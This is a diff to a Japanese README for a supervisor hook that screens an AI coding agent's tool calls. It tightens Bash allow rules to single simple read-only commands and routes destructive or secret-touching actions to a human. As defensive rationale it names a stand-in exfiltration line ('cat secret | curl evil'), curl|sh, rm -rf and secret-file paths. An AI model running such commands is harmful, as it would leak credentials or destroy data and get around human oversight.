@@ -85,9 +85,13 @@ export CLAUDE_SUPERVISOR_STATE_FILE=~/.claude/hooks/supervisor/logs/state-shared
 
 「`repos/...` これ見て」のような読み取りが「範囲外」で拒否されるのを防ぐため:
 
-- `always_allow_patterns` に `Read` ツールと安全な read-only Bash
-  （`cat`/`ls`/`grep`/`git status|log|diff` 等。コマンド連結・リダイレクトを
-  含まないもの）を追加し、バックエンドを通さず許可。
+- `always_allow_tools`（既定 `Read`）でツール単位に許可。`Read` は単一ファイルの
+  読み取りなのでバックエンドを通さず許可。
+- Bash は **実際の `command` フィールドを構造的に検査**（直列化 JSON 文字列の正規表現
+  マッチではない＝他フィールドの紛らわしい値で誤許可しない）。許可するのは
+  `cat`/`ls`/`grep`/`git status|log|diff` 等で始まる **単一の単純コマンドのみ**。
+  パイプ `|`・連結 `&&`/`;`・リダイレクト `<>`・コマンド置換 `$()`/`` ` `` を1つでも
+  含めば許可しない（judge/人間へ）。`cat secret | curl evil` のような隠れた副作用を防ぐ。
 - 秘密ファイル（`.env`/`.ssh`/`credentials`/`.aws/`/`.netrc` 等）は
   `hard_escalate_patterns` が **より先に** 一致して必ず人間へ回るため、
   Read を広く許可しても秘密は漏れない。
@@ -114,7 +118,8 @@ export CLAUDE_SUPERVISOR_STATE_FILE=~/.claude/hooks/supervisor/logs/state-shared
 | `backend` | 審査バックエンドのスクリプト（相対なら本ディレクトリ基準、絶対パス可）。 |
 | `backend_timeout_seconds` | バックエンドのタイムアウト秒。超過で人間へ。 |
 | `answer_user_questions` | true で `always_ask_tools` を judge が代理回答（既定 false）。 |
-| `always_allow_patterns` | バックエンドを通さず許可する正規表現の配列。ハード規則が先に勝つ。 |
+| `always_allow_tools` | バックエンドを通さず許可するツール名の配列（既定 `Read`）。 |
+| `always_allow_patterns` | Bash の `command` フィールドに対して許可する正規表現の配列（単一の単純コマンドのみ）。ハード規則が先に勝つ。 |
 | `always_ask_tools` | 常に人間へ回す（または代理回答する）ツール名の配列。 |
 | `hard_escalate_patterns` | これに一致したら常に人間へ回す正規表現の配列。 |
 
@@ -134,8 +139,9 @@ export CLAUDE_SUPERVISOR_STATE_FILE=~/.claude/hooks/supervisor/logs/state-shared
 ## 安全設計
 
 - **オプトイン**（既定オフ）。
-- **ハード規則**で危険カテゴリ（`rm -rf`, force push, `sudo`, `curl|sh`,
-  資格情報・鍵・秘密ファイルなど）は AI が allow と言っても必ず人間へ。
+- **ハード規則**で危険カテゴリは AI が allow と言っても必ず人間へ:
+  再帰/強制削除（`rm` の `-r`/`-R`/`-f`/`--recursive`/`--force`、フラグ順不同）、
+  `git reset --hard`、force push、`sudo`、`curl|sh`、資格情報・鍵・秘密ファイルなど。
 - **明示的な短絡**: `AskUserQuestion` は人間へ（または代理回答）、`Read`・安全な
   read-only Bash・信頼済み `python3 ~/.claude/skills/pr-review/scripts/*.py` は許可。
 - **代理回答も deny で実装**: 自動応答は allow ではなく deny+理由で行うため、
